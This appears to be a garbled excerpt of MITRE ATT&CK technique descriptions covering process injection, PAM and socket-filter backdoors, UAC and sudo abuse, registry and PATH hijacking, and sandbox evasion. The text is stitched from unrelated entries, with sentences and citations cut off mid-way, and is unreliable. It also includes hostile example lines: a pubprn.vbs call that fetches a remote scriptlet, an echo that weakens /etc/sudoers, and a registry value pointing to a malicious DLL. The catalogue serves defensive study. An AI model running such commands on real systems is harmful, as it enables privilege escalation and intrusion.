      name: 'Process Injection: Extra Window Memory Injection'
      description: "Adversaries may inject malicious code into process via Extra Window
        Memory (EWM) in order to evade process-based defenses as well as possibly
        elevate privileges. EWM injection is a method of executing arbitrary code
        in the address space of a separate live process. \n\nBefore creating a window,
        graphical Windows-based processes must prescribe to or register a windows
        class, which stipulate appearance and behavior (via windows procedures, which
        are functions that handle input/output of data).(Citation: Microsoft Window
        Classes) Registration of new windows classes can include a request for up
        to 40 bytes of EWM to be appended to the allocated memory of each instance
        of that class. This EWM is intended to store data specific to that window
        and has specific application programming interface (API) functions to set
        and get its value. (Citation: Microsoft GetWindowLong function) (Citation:
        Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough
        to store a 32-bit pointer and is often used to point to a windows procedure.
        Malware may possibly utilize this memory location in part of an attack chain
        that includes writing code to shared sections of the process’s memory, placing
        a pointer to the code in EWM, then invoking execution by returning execution
        control to the address in the process’s EWM.\n\nExecution granted through
        EWM injection may allow access to both the target process's memory and possibly
        elevated privileges. Writing payloads to shared sections also avoids the use
        of highly monitored API calls such as <code>WriteProcessMemory</code> and
        <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July
        2017) More sophisticated malware samples may also potentially bypass protection
        mechanisms such as data execution prevention (DEP) by triggering a combination
        of windows procedures and other system functions that will rewrite the malicious
        payload inside an executable portion of the target process.  (Citation: MalwareTech
        Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning
        code in the context of another process may allow access to the process's memory,
        system/network resources, and possibly elevated privileges. Execution via
        EWM injection may also evade detection from security products since the execution
        is masked under a legitimate process. "

      description: |-
        Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

        To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

        Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.

      name: Fileless Storage
      description: "Adversaries may store data in \"fileless\" formats to conceal
        malicious activity from defenses. Fileless storage can be broadly defined
        as any format other than a file. Common examples of non-volatile fileless
        storage in Windows systems include the Windows Registry, event logs, or WMI
        repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) Shared
        memory directories on Linux systems (`/dev/shm`, `/run/shm`, `/var/run`, and
        `/var/lock`) and volatile directories on Network Devices (`/tmp` and `/volatile`)
        may also be considered fileless storage, as files written to these directories
        are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary
        Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation:
        Aquasec Muhstik Malware 2024)(Citation: Bitsight 7777 Botnet)(Citation: CISCO
        Nexus 900 Config).\n\nSimilar to fileless in-memory behaviors such as [Reflective
        Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055),
        fileless data storage may remain undetected by anti-virus and other endpoint
        security tools that can only access specific file formats from disk storage.
        Leveraging fileless storage may also allow adversaries to bypass the protections
        offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware
        23022)\n\nAdversaries may use fileless storage to conceal various types of
        stored data, including payloads/shellcode (potentially being used as part
        of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data
        not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).
        Adversaries also often encrypt, encode, splice, or otherwise obfuscate this
        fileless data when stored. \n\nSome forms of fileless storage activity may
        indirectly create artifacts in the file system, but in central and otherwise
        difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`)
        or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation:

        rundll32.exe will first check for wide/Unicode then ANSI character-supported
        functions before loading the specified function (e.g., given the command <code>rundll32.exe
        ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to
        execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>,
        before loading <code>ExampleFunction</code>). Adversaries may therefore obscure
        malicious code by creating multiple identical exported function names and
        appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation:

        can also be exported and executed by an ordinal number (ex: <code>rundll32.exe

        techniques (such as changing DLL file names, file extensions, or function
        names) to further conceal execution of a malicious payload.(Citation: rundll32.exe

        Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

        Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

        Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

        An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.

        Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)

        Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)

        Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.

        File and directory permissions are commonly managed by ACLs configured by
        the file or directory owner, or users with the appropriate permissions. File
        and directory ACL implementations vary by platform, but generally explicitly
        designate which users or groups can perform which actions (read, write, execute,
        etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission
        groups (user, group, and other) and a standard set of permissions (read, write,
        and execute) that are applied to each group. While nuances of each platform’s
        permissions implementation may vary, most of the platforms provide two primary
        commands used to manipulate file and directory ACLs: <code>chown</code> (short
        for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial
        may use these commands to make themselves the owner of files and directories
        or change the mode if current permissions allow it. They could subsequently
        lock others out of the file. Specific file and directory modifications may
        be a required step for many techniques, such as establishing Persistence via

      name: 'Signed Script Proxy Execution: Pubprn'
      description: |-
        Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

        Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

        In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).

      name: Path Interception by PATH Environment Variable
      description: "Adversaries may execute their own malicious payloads by hijacking
        environment variables used to load libraries. The PATH environment variable
        contains a list of directories (User and System) that the OS searches sequentially
        through in search of the binary that was called from a script or the command
        line. \n\nAdversaries can place a malicious program in an earlier entry in
        the list of directories stored in the PATH environment variable, resulting
        in the operating system executing the malicious binary rather than the legitimate
        binary when it searches sequentially through that PATH listing.\n\nFor example,
        on Windows if an adversary places a malicious program named \"net.exe\" in
        `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`
        in the PATH environment variable, when \"net\" is executed from the command-line
        the `C:\\example path` will be called instead of the system's legitimate executable
        at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely
        on the PATH environment variable to determine the locations that are searched
        when the path for the program is not given, such as executing programs from
        a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:
        ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify
        the $PATH variable specifying the directories to be searched.  An adversary
        can modify the `$PATH` variable to point to a directory they have write access.
        When a program using the $PATH variable is called, the OS searches the specified
        directory and executes the malicious binary. On macOS, this can also be performed
        through modifying the $HOME variable. These variables can be modified using
        the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),
        or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC

Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

        Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)

      name: Modify Cloud Resource Hierarchy
      description: "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service
        (IaaS) environments in order to evade defenses.  \n\nIaaS environments often
        group resources into a hierarchy, enabling improved resource management and
        application of policies to relevant groups. Hierarchical structures differ
        among cloud providers. For example, in AWS environments, multiple accounts
        can be grouped under a single organization, while in Azure environments, multiple
        subscriptions can be grouped under a single management group.(Citation: AWS
        Organizations)(Citation: Microsoft Azure Resources)\n\nAdversaries may add,
        delete, or otherwise modify resource groups within an IaaS hierarchy. For
        example, in Azure environments, an adversary who has gained access to a Global
        Administrator account may create new subscriptions in which to deploy resources.
        They may also engage in subscription hijacking by transferring an existing
        pay-as-you-go subscription from a victim tenant to an adversary-controlled
        tenant. This will allow the adversary to use the victim’s compute resources
        without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm
        2023)(Citation: Microsoft Subscription Hijacking 2022)\n\nIn AWS environments,
        adversaries with appropriate permissions in a given account may call the `LeaveOrganization`
        API, causing the account to be severed from the AWS Organization to which
        it was tied and removing any Service Control Policies, guardrails, or restrictions
        imposed upon it by its former Organization. Alternatively, adversaries may
        call the `CreateAccount` API in order to create a new account within an AWS
        Organization. This account will use the same payment methods registered to
        the payment account but may not be subject to existing detections or Service
        Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)"

      name: 'Hide Artifacts: Email Hiding Rules'
      description: |-
        Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)

        Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.

        Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)

        In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).

      description: "Adversaries may encrypt or encode files to obfuscate strings,
        bytes, and other specific patterns to impede detection. Encrypting and/or
        encoding file content aims to conceal malicious artifacts within a file used
        in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),
        [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded
        Payloads](https://attack.mitre.org/techniques/T1027/009), share this same
        broad objective. Encrypting and/or encoding files could lead to a lapse in
        detection of static signatures, only for this malicious content to be revealed
        (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140))
        at the time of execution/use.\n\nThis type of file obfuscation can be applied
        to many file artifacts present on victim hosts, such as malware log/configuration
        and payload files.(Citation: File obfuscation) Files can be encrypted with
        a hardcoded or user-supplied key, as well as otherwise obfuscated using standard
        encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated,
        or just specific functions or values (such as C2 addresses). Encryption and
        encoding may also be applied in redundant layers for additional protection.\n\nFor
        example, adversaries may abuse password-protected Word documents or self-extracting
        (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566)
        payload. These files typically function by attaching the intended archived
        content to a decompressor stub that is executed when the file is invoked (e.g.,
        [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX
        - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as
        well as custom encoding schemes. For example, Byte Order Mark (BOM) headers
        in text files may be abused to manipulate and obfuscate file content until
        [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
        execution."

      description: "Adversaries may abuse a double extension in the filename as a
        means of masquerading the true file type. A file name may include a secondary
        file type extension that may cause only the first extension to be displayed

        However, the second extension is the true file type that determines how the
        file is opened and executed. The real file extension may be hidden by the

        DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries may abuse
        double extensions to attempt to conceal dangerous file types of payloads.
        A very common usage involves tricking a user into opening what they think
        is a benign file type but is actually executable code. Such files often pose
        as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001)

        then [User Execution](https://attack.mitre.org/techniques/T1204). For example,
        an executable file attachment named <code>Evil.txt.exe</code> may display
        as <code>Evil.txt</code> to a user. The user may then view it as a benign
        text file and open it, inadvertently executing the hidden malware.(Citation:
        SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt,
        .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first
        extension to appear benign. Executable extensions commonly regarded as dangerous,
        such as .exe, .lnk, .hta, and .scr, often appear as the second extension and
        true file type."

      description: |-
        Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

        Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

        Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)

      name: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching'
      description: |-
        Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

        Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

        The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

        Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

        In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.

      name: 'Hijack Execution Flow: Services Registry Permissions Weakness'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

        Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

        The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

        Adversaries may also add the <code>Parameters</code> key, which can reference malicious drivers file paths. This technique has been identified to be a method of abuse by configuring DLL file paths within the <code>Parameters</code> key of a given services registry configuration. By placing and configuring the <code>Parameters</code> key to reference a malicious DLL, adversaries can ensure that their code is loaded persistently whenever the associated service or library is invoked.

        For example, the registry path(Citation: MDSec) <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters</code>(Citation: hexacorn)(Citation: gendigital) contains the <code>AutodiaDLL</code> value, which specifies the DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code> to point to a hijacked or malicious DLL:

        <code>"AutodialDLL"="c:\temp\foo.dll"</code>

        This ensures persistence, as it causes the DLL (in this case, foo.dll) to be loaded each time the Winsock 2 library is invoked.

      description: |-
        Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

        In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)

        The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

        In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)

        Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)

        Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.

        Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)

      name: Masquerade File Type
      description: "Adversaries may masquerade malicious payloads as legitimate files
        through changes to the payload's formatting, including the file’s signature,
        extension, icon, and contents. Various file types have a typical standard
        format, including how they are encoded and organized. For example, a file’s
        signature (also known as header or magic bytes) is the beginning bytes of
        a file and is often used to identify the file’s type. For example, the header
        of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either
        `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header’s hex code
        and/or the file extension of a malicious payload in order to bypass file validation
        checks and/or input sanitization. This behavior is commonly used when payload
        files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))
        and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001))
        so that adversaries may move their malware without triggering detections.
        \n\nCommon non-executable file types and extensions, such as text files (`.txt`)
        and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.
        \ Based on this, adversaries may use a file extension to disguise malware,
        such as naming a PHP backdoor code with a file name of <code>test.gif</code>.
        A user may not know that a file is malicious due to the benign appearance
        and file extension.\n\nPolyglot files, which are files that have multiple
        different file types and that function differently based on the application
        that will execute them, may also be used to disguise malicious malware and
        capabilities.(Citation: polygot_icedID)"

      name: Domain Trust Modification
      description: "Adversaries may add new domain trusts, modify the properties of
        existing domain trusts, or otherwise change the configuration of trust relationships
        between domains and tenants to evade defenses and/or elevate privileges.Trust
        details, such as whether or not user identities are federated, allow authentication
        and authorization properties to apply between domains or tenants for the purpose
        of accessing shared resources.(Citation: Microsoft - Azure AD Federation)
        These trust objects may include accounts, credentials, and other authentication
        material applied to servers, tokens, and domains.\n\nManipulating these trusts
        may allow an adversary to escalate privileges and/or evade defenses by modifying
        settings to add objects which they control. For example, in Microsoft Active
        Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002)
        without the need to compromise the signing certificate to forge new credentials.
        Instead, an adversary can manipulate domain trusts to add their own signing
        certificate. An adversary may also convert an AD domain to a federated domain
        using Active Directory Federation Services (AD FS), which may enable malicious
        trust modifications such as altering the claim issuance rules to log in any
        valid set of credentials as a specified user.(Citation: AADInternals zure
        AD Federated Domain) \n\nAn adversary may also add a new federated identity
        provider to an identity tenant such as Okta or AWS IAM Identity Center, which
        may enable the adversary to authenticate as any user of the tenant.(Citation:
        Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to
        gain broad access into a variety of cloud-based services that leverage the
        identity tenant. For example, in AWS environments, an adversary that creates
        a new identity provider for an AWS Organization will be able to federate into
        all of the AWS Organization member accounts without creating identities for
        each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)"

        Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)

        Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)

        Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)

      description: |-
        Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.

        Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)

      description: "Adversaries may employ various system checks to detect and avoid
        virtualization and analysis environments. This may include changing behaviors
        based on the results of checks for the presence of artifacts indicative of
        a virtual machine environment (VME) or sandbox. If the adversary detects a
        VME, they may alter their malware to disengage from the victim or conceal
        the core functions of the implant. They may also search for VME artifacts
        before dropping secondary or additional payloads. Adversaries may use the
        information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.(Citation: Deloitte
        Environment Awareness)\n\nSpecific checks will vary based on the target and/or
        adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),
        [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information
        Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012)
        to obtain system information and search for VME artifacts. Adversaries may
        search for VME artifacts in memory, processes, file system, hardware, and/or
        the Registry. Adversaries may use scripting to automate these checks  into
        one script and then have the program exit if it determines the system to be
        a virtual environment. \n\nChecks could include generic system properties
        such as host/domain name and samples of network traffic. Adversaries may also
        check the network adapters addresses, CPU core count, and available memory/drive
        size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)
        to check if it was saved in a folder or file with unexpected or even analysis-related
        naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks
        may enumerate services running that are unique to these applications, installed
        programs on the system, manufacturer/product fields for strings relating to
        virtual machine applications, and VME-specific hardware/processor instructions.(Citation:
        McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also
        use a special I/O port to send commands and receive output. \n \nHardware
        checks, such as the presence of the fan, temperature, and audio devices, could
        also be used to gather evidence that can be indicative a virtual environment.
        Adversaries may also query for specific readings from these devices.(Citation:

